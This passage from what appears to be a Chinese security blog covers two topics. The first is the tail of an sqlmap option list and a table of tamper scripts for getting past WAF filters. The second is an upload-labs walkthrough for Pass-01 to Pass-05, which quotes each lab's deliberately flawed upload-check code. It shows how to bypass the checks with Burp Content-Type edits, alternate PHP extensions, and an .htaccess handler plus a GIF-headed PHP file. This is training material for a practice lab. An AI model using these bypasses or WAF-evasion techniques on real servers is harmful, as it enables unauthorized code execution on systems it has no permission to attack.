--purge-output      从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
--save&#x3D;SAVECONFIG   保存选项到INI配置文件
--scope&#x3D;SCOPE       从提供的代理日志中使用正则表达式过滤目标
--skip-waf          跳过WAF／IPS &#x2F; IDS启发式检测保护
--smart             进行积极的启发式测试，快速判断为注入的报错点进行注入
--sqlmap-shell      互动提示一个sqlmapshell
--test-filter&#x3D;TE..  选择测试的有效载荷和&#x2F;或标题(e.g. ROW)
--test-skip&#x3D;TEST..  跳过试验载荷和&#x2F;或标题(e.g.BENCHMARK)
--tmp-dir&#x3D;TMPDIR    用于存储临时文件的本地目录
--update            更新sqlmap
--web-root&#x3D;WEBROOT  Web服务器的文档根目录(e.g.&quot;&#x2F;var&#x2F;www&quot;)
--wizard            新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="tamper中部分脚本"><a href="#tamper中部分脚本" class="headerlink" title="tamper中部分脚本"></a>tamper中部分脚本</h1><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">apostrophemask.py</td>
<td style="text-align:left">用utf8代替引号</td>
</tr>
<tr>
<td style="text-align:left">apostrophenullencode.py</td>
<td style="text-align:left">绕过过滤双引号，替换字符和双引号。</td>
</tr>
<tr>
<td style="text-align:left">appendnullbyte.py</td>
<td style="text-align:left">在有效负荷结束位置加载零字节字符编码</td>
</tr>
<tr>
<td style="text-align:left">base64encode.py</td>
<td style="text-align:left">用base64编码替换</td>
</tr>
<tr>
<td style="text-align:left">between.py</td>
<td style="text-align:left">用between替换大于号（&gt;）</td>
</tr>
<tr>
<td style="text-align:left">bluecoat.py</td>
<td style="text-align:left">代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like</td>
</tr>
<tr>
<td style="text-align:left">chardoubleencode.py</td>
<td style="text-align:left">双url编码(不处理以编码的)</td>
</tr>
<tr>
<td style="text-align:left">charencode.py</td>
<td style="text-align:left">url编码</td>
</tr>
<tr>
<td style="text-align:left">charunicodeencode.py</td>
<td style="text-align:left">字符串 unicode 编码</td>
</tr>
<tr>
<td style="text-align:left">equaltolike.py</td>
<td style="text-align:left">like代替等号</td>
</tr>
<tr>
<td style="text-align:left">greatest.py</td>
<td style="text-align:left">绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
</tr>
<tr>
<td style="text-align:left">halfversionedmorekeywords.py</td>
<td style="text-align:left">关键字前加注释</td>
</tr>
<tr>
<td style="text-align:left">halfversionedmorekeywords.py</td>
<td style="text-align:left">当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td>
</tr>
<tr>
<td style="text-align:left">ifnull2ifisnull.py</td>
<td style="text-align:left">绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</td>
</tr>
<tr>
<td style="text-align:left">modsecurityversioned.py</td>
<td style="text-align:left">过滤空格，包含完整的查询版本注释</td>
</tr>
<tr>
<td style="text-align:left">multiplespaces.py</td>
<td style="text-align:left">围绕SQL关键字添加多个空格</td>
</tr>
<tr>
<td style="text-align:left">randomcase.py</td>
<td style="text-align:left">随机大小写</td>
</tr>
<tr>
<td style="text-align:left">randomcomments.py</td>
<td style="text-align:left">用/**/分割sql关键字</td>
</tr>
<tr>
<td style="text-align:left">sp_password.py</td>
<td style="text-align:left">追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
</tr>
<tr>
<td style="text-align:left">space2comment.py</td>
<td style="text-align:left">用/**/代替空格</td>
</tr>
<tr>
<td style="text-align:left">space2dash.py</td>
<td style="text-align:left">绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</td>
</tr>
<tr>
<td style="text-align:left">space2hash.py</td>
<td style="text-align:left">空格替换为#号,随机字符串以及换行符</td>
</tr>
<tr>
<td style="text-align:left">space2morehash.py</td>
<td style="text-align:left">空格替换为 #号 以及更多随机字符串 换行符</td>
</tr>
<tr>
<td style="text-align:left">space2mssqlblank.py</td>
<td style="text-align:left">(mssql)空格替换为其它空符号</td>
</tr>
<tr>
<td style="text-align:left">space2mssqlhash.py</td>
<td style="text-align:left">替换空格</td>
</tr>
<tr>
<td style="text-align:left">space2mysqlblank.py</td>
<td style="text-align:left">空格替换其它空白符号(mysql)</td>
</tr>
<tr>
<td style="text-align:left">space2mysqldash.py</td>
<td style="text-align:left">替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
</tr>
<tr>
<td style="text-align:left">space2plus.py</td>
<td style="text-align:left">用+替换空格</td>
</tr>
<tr>
<td style="text-align:left">space2randomblank.py</td>
<td style="text-align:left">代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td>
</tr>
<tr>
<td style="text-align:left">space2comment.py</td>
<td style="text-align:left">替换空格字符串(‘‘) 使用注释‘/**/’</td>
</tr>
<tr>
<td style="text-align:left">unionalltounion.py</td>
<td style="text-align:left">替换UNION ALLSELECT UNION SELECT</td>
</tr>
<tr>
<td style="text-align:left">unmagicquotes.py</td>
<td style="text-align:left">宽字符绕过 GPCaddslashes</td>
</tr>
<tr>
<td style="text-align:left">versionedmorekeywords.py</td>
<td style="text-align:left">注释绕过</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>sqli</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs通关记录</title>
    <url>/2021/07/03/upload-labs-tong-guan-ji-lu/</url>
    <content><![CDATA[<blockquote>
<p>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<p>参考：<a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labs通关记录</a></p>
</blockquote>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/mind-map.png" class title="image">
<span id="more"></span>
<h1 id="Pass-01-客户端JS检查"><a href="#Pass-01-客户端JS检查" class="headerlink" title="Pass-01 客户端JS检查"></a>Pass-01 客户端JS检查</h1><p>源码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//定义允许上传的文件类型</span>
    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
    <span class="token comment">//提取上传文件的类型</span>
    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//判断上传文件类型是否允许上传</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只在前端做了JS检查，直接禁止JS即可上传</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/143747.png" class title="image">
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/143842.png" class title="image">
<h1 id="Pass-02-服务端MIME检查"><a href="#Pass-02-服务端MIME检查" class="headerlink" title="Pass-02 服务端MIME检查"></a>Pass-02 服务端MIME检查</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接Burp抓包修改content-type上传</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/145653.png" class title="image">
<h1 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里不允许上传.asp,.aspx,.php,.jsp后缀文件，那么试试上传.php3、.php5</p>
<p>但可以上传<code>.phtml .phps .php5 .pht</code><br>前提是apache的httpd.conf中有如下配置代码</p>
<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml .phps .php3 .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/152424.png" class title="image">
<p>我也不清楚我这为啥没执行</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/152851.png" class title="image">
<h1 id="Pass-04-htacccess绕过"><a href="#Pass-04-htacccess绕过" class="headerlink" title="Pass-04 .htacccess绕过"></a>Pass-04 .htacccess绕过</h1><p>源码（部分）：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>黑名单拒绝了几乎所有有问题的后缀名，除了.htaccess<br>前提条件</p>
<p>1.mod_rewrite模块开启。</p>
<p>2.AllowOverride All</p>
<p>因此先上传一个.htaccess文件，内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样所有文件都会解析为php，然后再上传图片马，就可以解析</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/204029.png" class title="image">
<h1 id="Pass-05-空格-绕过"><a href="#Pass-05-空格-绕过" class="headerlink" title="Pass-05 . + 空格 + . 绕过"></a>Pass-05 <code>.</code> + 空格 + <code>.</code> 绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
